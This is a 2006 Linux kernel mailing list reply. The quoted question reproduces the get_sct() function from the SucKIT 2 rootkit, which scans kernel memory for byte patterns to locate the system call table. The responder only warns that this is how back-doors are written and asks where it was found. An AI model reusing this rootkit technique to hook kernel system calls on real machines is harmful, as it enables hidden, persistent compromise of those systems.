Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1750962AbWDFMPb@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1750962AbWDFMPb (ORCPT <rfc822;willy@w.ods.org>);
	Thu, 6 Apr 2006 08:15:31 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751055AbWDFMPb
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Thu, 6 Apr 2006 08:15:31 -0400
Received: from odyssey.analogic.com ([204.178.40.5]:12549 "EHLO
	odyssey.analogic.com") by vger.kernel.org with ESMTP
	id S1750900AbWDFMPa convert rfc822-to-8bit (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Thu, 6 Apr 2006 08:15:30 -0400
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7BIT
X-MimeOLE: Produced By Microsoft Exchange V6.5.7226.0
in-reply-to: <6ff3e7140604051838k1b332990i488f373aad99fa71@mail.gmail.com>
x-originalarrivaltime: 06 Apr 2006 12:15:25.0825 (UTC) FILETIME=[C9320F10:01C65973]
Content-class: urn:content-classes:message
Subject: Re: What means "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"
Date: Thu, 6 Apr 2006 08:15:25 -0400
Message-ID: <Pine.LNX.4.61.0604060813380.8803@chaos.analogic.com>
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
Thread-Topic: What means "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"
Thread-Index: AcZZc8k5jHgvt+KpQR+4fXzKWcs/Ng==
References: <6ff3e7140604051838k1b332990i488f373aad99fa71@mail.gmail.com>
From: "linux-os \(Dick Johnson\)" <linux-os@analogic.com>
To: "openbsd shen" <openbsd.shen@gmail.com>
Cc: "kernel" <linux-kernel@vger.kernel.org>
Reply-To: "linux-os \(Dick Johnson\)" <linux-os@analogic.com>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org



In what file did you find this? This is how back-doors are written!

On Wed, 5 Apr 2006, openbsd shen wrote:

> this code from get_sct() of suckit 2, why memmem()
> "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"use, what it want to find?
> The get_sct() founction:
>
> ulong   get_sct()
> {
>        uchar   code[SCLEN+256];
>        uchar   *p, *pt;
>        ulong   r;
>        uchar   pt_off, pt_bit;
>        int     i;
>
>        kernel_old80 = get_ep();
>
>        if (!kernel_old80)
>                return 0;
>        if (rkm(code, sizeof(code), kernel_old80-4) <= 0)
>                return 0;
>
>        if (!memcmp(code, "PUNK", 4))
>                return 0;
>
>        p = (char *) memmem(code, SCLEN, "\xff\x14\x85", 3);
>        if (!p) return 0;
>
>        pt = (char *) memmem(p+7, SCLEN-(p-code)-7,
>                "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8", 9);
>        /* when run at here , it always return 0 */
>        if (!pt) {
>                eprintf("pt = %s\n", pt);
>                return 0;
>        }
>
>        sc.trace = *((ulong *) (pt + 9));
>        sc.trace += kernel_old80 + (pt - code) - 4 + 9 + 4;
>
>        pt = (char *) memmem(p+7, SCLEN-(p-code)-7, "\xff\x14\x85", 3);
>        if (!pt) return 0;
>
>        for (i = 0; i < (p-code); i++) {
>                if ((code[i] == 0xf6) && (code[i+1] == 0x43) &&
>                    (code[i+4] == 0x75) && (code[i+2] < 127)) {
>                        pt_off = code[i+2];
>                        pt_bit = code[i+3];
>                        goto cc;
>                }
>        }
>
>        return 0;
> }
> -

Cheers,
Dick Johnson
Penguin : Linux version 2.6.15.4 on an i686 machine (5589.42 BogoMips).
Warning : 98.36% of all statistics are fiction, book release in April.
_


****************************************************************
The information transmitted in this message is confidential and may be privileged.  Any review, retransmission, dissemination, or other use of this information by persons or entities other than the intended recipient is prohibited.  If you are not the intended recipient, please notify Analogic Corporation immediately - by replying to this message or by sending an email to DeliveryErrors@analogic.com - and destroy all copies of this information, including any attachments, without reading or disclosing them.

Thank you.
